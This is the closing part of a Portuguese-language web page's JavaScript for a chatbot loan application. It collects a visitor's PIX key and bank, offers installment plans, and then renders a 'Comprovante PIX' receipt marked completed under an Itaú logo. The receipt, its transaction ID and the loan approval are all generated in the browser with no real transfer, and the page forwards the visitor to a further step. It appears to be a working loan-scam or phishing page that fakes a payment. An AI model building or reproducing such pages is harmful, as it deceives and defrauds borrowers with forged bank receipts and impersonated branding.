      btnNao.textContent = 'Não, quero corrigir';
      btnNao.onclick = () => confirmPixKey(false, container);
      
      container.appendChild(btnSim);
      container.appendChild(btnNao);
      chatMessages.appendChild(container);
      scrollToBottom();
    }

    function confirmPixKey(confirmed, container) {
      container.querySelectorAll('.option-button').forEach(b => b.disabled = true);
      
      if (confirmed) {
        addMessage('Sim, está correta', true);
        pixKey = tempPixKey;
        localStorage.setItem('chave_pix', tempPixKey);
        setTimeout(() => {
          container.remove();
          showTyping();
          setTimeout(() => {
            removeTyping();
            addMessage('Perfeito! Agora digite o nome do seu banco:');
            setTimeout(() => showInput('bank', 'Digite o nome do banco...'), 300);
          }, 1000);
        }, 500);
      } else {
        addMessage('Não, quero corrigir', true);
        setTimeout(() => {
          container.remove();
          showTyping();
          setTimeout(() => {
            removeTyping();
            addMessage(`Ok! Digite novamente sua chave ${selectedPixType}:`);
            setTimeout(() => showInput('pix', `Digite sua chave ${selectedPixType}...`), 300);
          }, 1000);
        }, 500);
      }
    }

    function sendBank(value) { bankName = value; localStorage.setItem('banco', value); hideInput(); addMessage(value, true); setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[currentQuestion].text, false, true); }, 1500); }, 800); }

    function finishChat() { 
      setTimeout(() => { 
        showTyping(); 
        setTimeout(() => { 
          removeTyping(); 
          addMessage('Perfeito! Agora me diga: quanto você precisa?');
          showAmountSlider();
        }, 1000); 
      }, 800); 
    }

    function showAmountSlider() {
      const sliderContainer = document.createElement('div');
      sliderContainer.className = 'slider-container';
      sliderContainer.innerHTML = `
        <div class="slider-card">
          <div class="slider-header">
            <span class="slider-label">Valor do empréstimo</span>
            <div class="slider-value-display" id="sliderValueDisplay">R$ 10.000</div>
          </div>
          
          <div class="slider-wrapper">
            <input type="range" min="1000" max="30000" value="10000" step="500" class="amount-slider" id="amountSlider">
            <div class="slider-track-fill" id="sliderTrackFill"></div>
          </div>
          
          <div class="slider-limits">
            <span>R$ 1.000</span>
            <span>R$ 30.000</span>
          </div>
          
          <button class="slider-confirm-btn" id="sliderConfirmBtn">
            Confirmar valor
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
          </button>
        </div>
      `;
      
      chatMessages.appendChild(sliderContainer);
      scrollToBottom();
      
      const slider = document.getElementById('amountSlider');
      const valueDisplay = document.getElementById('sliderValueDisplay');
      const trackFill = document.getElementById('sliderTrackFill');
      const confirmBtn = document.getElementById('sliderConfirmBtn');
      
      function updateSlider() {
        const value = parseInt(slider.value);
        const percentage = ((value - 1000) / (30000 - 1000)) * 100;
        valueDisplay.textContent = value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', minimumFractionDigits: 0 });
        trackFill.style.width = percentage + '%';
      }
      
      slider.addEventListener('input', updateSlider);
      updateSlider();
      
      confirmBtn.addEventListener('click', () => {
        const value = parseInt(slider.value);
        sliderContainer.style.pointerEvents = 'none';
        sliderContainer.style.opacity = '0.7';
        
        selectedLoanAmount = value;
        localStorage.setItem('selectedLoanAmount', value);
        addMessage(value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }), true);
        
        setTimeout(() => {
          sliderContainer.remove();
          showTyping();
          setTimeout(() => {
            removeTyping();
            addMessage('Ótimo! Agora escolha em quantas vezes você quer pagar:');
            showInstallmentOptions(value);
          }, 1000);
        }, 500);
      });
    }

    function showInstallmentOptions(amount) {
      const r = 0.0081;
      const options = [];
      [3, 6, 12, 24, 36, 48, 60, 120].forEach(m => {
        const iv = (amount * (r * Math.pow(1 + r, m))) / (Math.pow(1 + r, m) - 1);
        options.push({ months: m, monthly: iv, total: iv * m });
      });
      const grid = document.createElement('div');
      grid.className = 'installments-grid';
      
      options.forEach((op, index) => {
        const card = document.createElement('div');
        card.className = 'installment-card';
        card.onclick = () => selectInstallment(op.months, op.monthly, op.total);
        
        const isPopular = op.months === 24;
        if (isPopular) {
          card.style.border = '2px solid var(--green-accent)';
          card.style.boxShadow = '0 4px 15px rgba(122,185,45,0.2)';
        }
        
        card.innerHTML = `
          ${isPopular ? '<div style="position:absolute;top:8px;right:8px;background:var(--green-accent);color:white;font-size:9px;padding:2px 6px;border-radius:10px;font-weight:700;">POPULAR</div>' : ''}
          <div class="installment-months">${op.months}x</div>
          <div class="installment-value">${op.monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
          <div class="installment-total">Total: ${op.total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
        `;
        grid.appendChild(card);
      });
      
      chatMessages.appendChild(grid);
      scrollToBottom();
    }

    function selectInstallment(months, monthly, total) {
      selectedInstallments = months;
      selectedMonthlyPayment = monthly;
      localStorage.setItem('selectedInstallments', months);
      localStorage.setItem('selectedMonthlyPayment', monthly);
      document.querySelectorAll('.installment-card').forEach(c => { c.style.pointerEvents = 'none'; c.style.opacity = '0.5'; });
      addMessage(`${months}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`, true);
      setTimeout(() => {
        document.querySelectorAll('.installments-grid').forEach(g => g.remove());
        showTyping();
        setTimeout(() => { removeTyping(); addMessage('Perfeito! Vou processar o pagamento agora...'); setTimeout(showReceipt, 1500); }, 1000);
      }, 500);
    }

    function showReceipt() {
      const tid = 'E' + Date.now().toString().substring(5);
      const d = new Date();
      const ds = d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
      const ts = d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const rn = userName || 'Cliente';
      const rc = localStorage.getItem('cpf') || '000.000.000-00';
      const r = document.createElement('div');
      r.className = 'receipt-wrapper';
      r.id = 'pixReceipt';
      r.style.padding = '0 16px';
      r.style.marginTop = '16px';
      r.innerHTML = `
        <div class="pix-receipt">
          <div class="receipt-header">

            <!-- ✅ LOGO EM IMAGEM NO RECIBO -->
            <div class="receipt-logo-img" style="margin:0 auto 12px;text-align:center">
              <img src="/images/logo.png" alt="Itaú">
            </div>

            <div class="receipt-title">Comprovante PIX</div>
            <span class="receipt-status"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Concluído</span>
          </div>
          <div class="receipt-amount">
            <div class="receipt-amount-label">Valor</div>
            <div class="receipt-amount-value">${selectedLoanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
          </div>
          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">AgilizaCred Financeira S.A.<br>CNPJ 36.947.229/0001-85</span></div>
          <div class="receipt-row"><span class="receipt-label">Para</span><span class="receipt-value">${rn}<br>CPF ${rc}</span></div>
          <div class="receipt-row"><span class="receipt-label">Chave PIX</span><span class="receipt-value">${pixKey}</span></div>
          <div class="receipt-row"><span class="receipt-label">Banco Destino</span><span class="receipt-value">${bankName}</span></div>
          <div class="receipt-row"><span class="receipt-label">Parcelas</span><span class="receipt-value">${selectedInstallments}x de ${selectedMonthlyPayment.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span></div>
          <div class="receipt-row"><span class="receipt-label">Data/Hora</span><span class="receipt-value">${ds} ${ts}</span></div>
          <div class="receipt-row"><span class="receipt-label">ID Transação</span><span class="receipt-value">${tid}</span></div>
          <div class="receipt-footer">Transação realizada via PIX<br>AgilizaCred Soluções Financeiras Ltda.</div>
        </div>`;
      chatMessages.appendChild(r);
      scrollToBottom();
      setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage('Confirme digitando "SIM" para finalizar sua solicitação:'); setTimeout(() => showInput('confirmation', 'Digite SIM para confirmar...'), 300); }, 1500); }, 2000);
    }

    function sendConfirmation(value) {
      if (value.toUpperCase() !== 'SIM') { alert('Por favor, digite "SIM" para confirmar'); return; }
      hideInput();
      addMessage('SIM', true);
      setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage('Perfeito! Agora vou finalizar sua análise...'); setTimeout(() => { document.getElementById('chatContainer').style.display = 'none'; document.getElementById('loadingContainer').style.display = 'flex'; setTimeout(showApproval, 3000); }, 1500); }, 1000); }, 500);
    }

    function showApproval() {
      document.getElementById('loadingContainer').style.display = 'none';
      const fa = selectedLoanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      const fm = selectedMonthlyPayment.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      document.getElementById('approvalDetails').innerHTML = `
        <div class="approval-detail"><span class="detail-label">Valor Aprovado</span><span class="detail-value">${fa}</span></div>
        <div class="approval-detail"><span class="detail-label">Parcelas</span><span class="detail-value">${selectedInstallments}x de ${fm}</span></div>
        <div class="approval-detail"><span class="detail-label">Taxa de Juros</span><span class="detail-value">0,81% a.m.</span></div>
        <div class="approval-detail"><span class="detail-label">Primeira Parcela</span><span class="detail-value">Março/2026</span></div>`;
      document.getElementById('approvalModal').style.display = 'flex';
      createConfetti();
    }

    function createConfetti() {
      const colors = ['#22C55E', '#16A34A', '#111827', '#FFD700', '#4ECDC4'];
      for (let i = 0; i < 50; i++) {
        setTimeout(() => {
          const cf = document.createElement('div');
          cf.className = 'confetti';
          cf.style.left = Math.random() * 100 + '%';
          cf.style.background = colors[Math.floor(Math.random() * colors.length)];
          cf.style.animationDuration = (Math.random() * 2 + 2) + 's';
          cf.style.top = '-10px';
          document.getElementById('approvalModal').appendChild(cf);
          setTimeout(() => cf.remove(), 3000);
        }, i * 50);
      }
    }

    function goToNextPage() {
      const p = new URLSearchParams(window.location.search);
      window.location.href = '6.html' + (p.toString() ? '?' + p : '');
    }

    loadUserData();
    setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[0].text, false, true); }, 2000); }, 500);
  </script>


</body></html>
